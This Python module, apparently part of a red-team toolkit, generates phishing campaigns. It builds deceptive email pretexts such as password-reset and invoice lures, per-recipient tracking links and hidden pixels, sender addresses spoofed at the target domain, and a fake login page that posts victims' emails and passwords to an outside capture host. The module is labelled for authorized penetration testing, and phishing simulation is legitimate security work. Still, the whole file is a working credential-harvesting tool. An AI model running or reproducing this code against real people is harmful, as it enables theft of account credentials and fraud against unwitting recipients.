"""Phishing Campaign Module.

Generate phishing campaign templates with tracking capabilities for
authorized penetration testing engagements only.
"""

import asyncio
import hashlib
import uuid
from datetime import datetime
from typing import Any, Dict, List, Tuple
from urllib.parse import quote, urlencode

from src.core.base_module import (
    AtsModule,
    ModuleSpec,
    ModuleCategory,
    Parameter,
    ParameterType,
    OutputField,
)

# Pre-built phishing scenario templates
SCENARIO_TEMPLATES = {
    "password_reset": {
        "subject": "Urgent: Your password will expire in 24 hours",
        "pretext": "IT Security team requires all employees to update their credentials.",
        "cta": "Reset Password Now",
    },
    "shared_document": {
        "subject": "New document shared with you: Q4 Financial Report",
        "pretext": "A colleague has shared an important document that requires your review.",
        "cta": "View Document",
    },
    "invoice": {
        "subject": "Invoice #{{invoice_id}} - Payment Required",
        "pretext": "Please review the attached invoice and process payment at your earliest convenience.",
        "cta": "View Invoice",
    },
    "mfa_setup": {
        "subject": "Action Required: Enable Multi-Factor Authentication",
        "pretext": "New company policy requires MFA enrollment by end of week.",
        "cta": "Set Up MFA",
    },
    "meeting_invite": {
        "subject": "Updated Meeting: Quarterly Review - Action Required",
        "pretext": "The meeting details have changed. Please confirm your attendance.",
        "cta": "Confirm Attendance",
    },
}


class PhishingCampaignModule(AtsModule):
    """Generate phishing campaign templates with tracking for authorized pentests."""

    def get_spec(self) -> ModuleSpec:
        return ModuleSpec(
            name="phishing_campaign",
            category=ModuleCategory.RED_TEAM,
            description="Generate phishing campaign templates with tracking URLs for authorized penetration testing",
            version="1.0.0",
            parameters=[
                Parameter(
                    name="target",
                    type=ParameterType.STRING,
                    description="Target organization domain (e.g. example.com)",
                    required=True,
                ),
                Parameter(
                    name="scenario",
                    type=ParameterType.CHOICE,
                    description="Phishing scenario template to use",
                    required=False,
                    default="password_reset",
                    choices=list(SCENARIO_TEMPLATES.keys()),
                ),
                Parameter(
                    name="targets_list",
                    type=ParameterType.LIST,
                    description="List of target email addresses for the campaign",
                    required=True,
                ),
                Parameter(
                    name="tracking_domain",
                    type=ParameterType.STRING,
                    description="Domain for hosting the phishing landing page and tracking pixel",
                    required=True,
                ),
                Parameter(
                    name="sender_name",
                    type=ParameterType.STRING,
                    description="Display name for the sender",
                    required=False,
                    default="IT Security Team",
                ),
            ],
            outputs=[
                OutputField(name="campaign_id", type="str", description="Unique campaign identifier"),
                OutputField(name="emails", type="list", description="Generated email payloads per target"),
                OutputField(name="landing_page_html", type="str", description="Landing page HTML template"),
                OutputField(name="summary", type="dict", description="Campaign summary"),
            ],
            tags=["red_team", "phishing", "social_engineering", "campaign"],
            dangerous=True,
        )

    def validate_inputs(self, config: Dict[str, Any]) -> Tuple[bool, str]:
        if not config.get("target"):
            return False, "Target organization domain is required"
        if not config.get("targets_list"):
            return False, "At least one target email address is required"
        if not config.get("tracking_domain"):
            return False, "Tracking domain is required"
        return True, ""

    def _generate_tracking_id(self, campaign_id: str, email: str) -> str:
        """Generate a unique tracking ID per recipient."""
        raw = f"{campaign_id}:{email}:{uuid.uuid4().hex[:8]}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    def _build_tracking_url(self, tracking_domain: str, tracking_id: str) -> str:
        """Build a click-tracking URL."""
        params = urlencode({"tid": tracking_id, "r": "1"})
        return f"https://{tracking_domain}/track?{params}"

    def _build_tracking_pixel(self, tracking_domain: str, tracking_id: str) -> str:
        """Build an invisible tracking pixel for open detection."""
        return (
            f'<img src="https://{tracking_domain}/pixel.gif?tid={tracking_id}" '
            f'width="1" height="1" style="display:none" alt="" />'
        )

    def _build_email_body(self, scenario: Dict[str, Any], tracking_url: str,
                          tracking_pixel: str, sender_name: str, target_email: str) -> str:
        """Build the HTML email body from the scenario template."""
        return f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body style="font-family:Arial,sans-serif;margin:0;padding:20px;background:#f9f9f9;">
  <div style="max-width:600px;margin:0 auto;background:#fff;padding:30px;border-radius:8px;">
    <h2 style="color:#333;">{scenario['subject']}</h2>
    <p style="color:#555;line-height:1.6;">Dear {target_email.split('@')[0].replace('.', ' ').title()},</p>
    <p style="color:#555;line-height:1.6;">{scenario['pretext']}</p>
    <div style="text-align:center;margin:30px 0;">
      <a href="{tracking_url}" style="background:#0066cc;color:#fff;padding:12px 30px;
         text-decoration:none;border-radius:5px;font-weight:bold;">{scenario['cta']}</a>
    </div>
    <p style="color:#999;font-size:12px;">This is an automated message from {sender_name}.</p>
    {tracking_pixel}
  </div>
</body>
</html>"""

    def _build_landing_page(self, target_domain: str, tracking_domain: str, scenario_name: str) -> str:
        """Generate a credential-harvesting landing page template."""
        return f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>{target_domain} - Verification Required</title>
  <style>
    body {{ font-family:Arial,sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }}
    .container {{ background:#fff; padding:40px; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,.1); width:380px; }}
    h2 {{ text-align:center; color:#333; margin-bottom:25px; }}
    input {{ width:100%; padding:12px; margin:8px 0; border:1px solid #ddd; border-radius:5px; box-sizing:border-box; }}
    button {{ width:100%; padding:12px; background:#0066cc; color:#fff; border:none; border-radius:5px; cursor:pointer; font-size:16px; margin-top:10px; }}
    .logo {{ text-align:center; margin-bottom:20px; font-size:24px; font-weight:bold; color:#0066cc; }}
    .note {{ text-align:center; font-size:12px; color:#999; margin-top:15px; }}
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">{target_domain}</div>
    <h2>Account Verification</h2>
    <form method="POST" action="https://{tracking_domain}/capture">
      <input type="hidden" name="scenario" value="{scenario_name}" />
      <input type="email" name="email" placeholder="Email address" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Verify Account</button>
    </form>
    <p class="note">Authorized security assessment - {target_domain}</p>
  </div>
</body>
</html>"""

    async def execute(self, config: Dict[str, Any]) -> Dict[str, Any]:
        target_domain = config["target"].strip()
        scenario_name = config.get("scenario", "password_reset")
        targets_list = config["targets_list"]
        tracking_domain = config["tracking_domain"].strip()
        sender_name = config.get("sender_name", "IT Security Team")

        campaign_id = uuid.uuid4().hex[:12]
        scenario = SCENARIO_TEMPLATES[scenario_name]

        self.logger.info("phishing_campaign_generate", domain=target_domain, targets=len(targets_list))

        emails: List[Dict[str, Any]] = []
        for email_addr in targets_list:
            email_addr = email_addr.strip()
            tracking_id = self._generate_tracking_id(campaign_id, email_addr)
            tracking_url = self._build_tracking_url(tracking_domain, tracking_id)
            tracking_pixel = self._build_tracking_pixel(tracking_domain, tracking_id)

            body = self._build_email_body(scenario, tracking_url, tracking_pixel, sender_name, email_addr)
            emails.append({
                "to": email_addr,
                "from_display": f"{sender_name} <noreply@{target_domain}>",
                "subject": scenario["subject"],
                "html_body": body,
                "tracking_id": tracking_id,
                "tracking_url": tracking_url,
            })

        landing_page = self._build_landing_page(target_domain, tracking_domain, scenario_name)

        summary = {
            "campaign_id": campaign_id,
            "target_domain": target_domain,
            "scenario": scenario_name,
            "total_targets": len(emails),
            "tracking_domain": tracking_domain,
            "generated_at": datetime.utcnow().isoformat(),
        }

        self.logger.info("phishing_campaign_ready", campaign_id=campaign_id, emails=len(emails))

        return {
            "campaign_id": campaign_id,
            "emails": emails,
            "landing_page_html": landing_page,
            "summary": summary,
        }
